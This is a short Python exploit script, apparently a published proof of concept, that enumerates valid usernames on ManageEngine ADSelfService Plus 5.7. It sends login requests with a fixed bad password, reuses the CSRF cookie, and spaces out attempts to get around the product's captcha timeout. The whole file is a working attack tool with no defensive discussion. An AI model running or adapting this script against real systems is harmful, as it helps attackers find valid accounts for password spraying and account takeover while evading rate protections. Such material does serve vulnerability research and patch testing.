#Title: ManageEngine ADSelfService Plus User Enumeration
#Tested Version: 5.7 Build 5704
#Date: 03/21/2019
#Author: Charles Dardaman

import requests
import sys
import time
from urllib.parse import urlparse

print("Usage: python3 user_enum.py userfile.txt url")

headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0',"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate",'Referer':sys.argv[2],"Content-Type":"application/x-www-form-urlencoded","Connection":"close"}
url = urlparse(sys.argv[2])

print("Usernames found:")

#for each username in the file given make a request and see if the username is valid, if it is then return the username
count = 0
with open(sys.argv[1], "r") as file:
    for line in file:
        #Get cookies
        s = requests.Session()
        r = s.get(url.scheme + "://" + url.netloc + "/adminLogin.cc")
    
        #Build POST data
        post_data = "j_username=" + line.rstrip() + "&j_password=badpass&domainName=ADSelfService+Plus+Authentication&AUTHRULE_NAME=ADAuthenticator&adscsrf=" + s.cookies.get_dict()["adscsrf"] 

        request_path = sys.argv[2] + "/j_security_check?loginComponent=AdminLogin&formSubmit=SSP"

        #Build Request
        req = requests.Request('POST',request_path,data=post_data, cookies=s.cookies.get_dict(), headers=headers)
        prepared = req.prepare()
        #Send the Request
        r = s.send(prepared)

        #If username is found print it
        if r.text.find("loginName") > 0:
           print(line.rstrip())

        count += 1

        #This slow down is used to bypass their default captcha timeout
        if count == 3:
            count = 0
            time.sleep(1850)
